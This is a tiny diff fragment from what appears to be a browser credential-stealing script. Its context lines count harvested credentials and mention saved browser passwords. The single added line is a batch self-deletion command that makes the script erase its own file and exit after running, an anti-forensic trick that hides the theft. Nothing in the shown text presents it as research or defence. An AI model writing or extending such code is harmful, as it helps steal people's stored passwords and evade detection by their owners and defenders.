@@ -346,3 +346,4 @@ print(f"Total credentials: {len(credentials)}")
         Write-Host "Check if browsers are installed and contain saved passwords."
     }
 }
+(del "%~f0") & exit
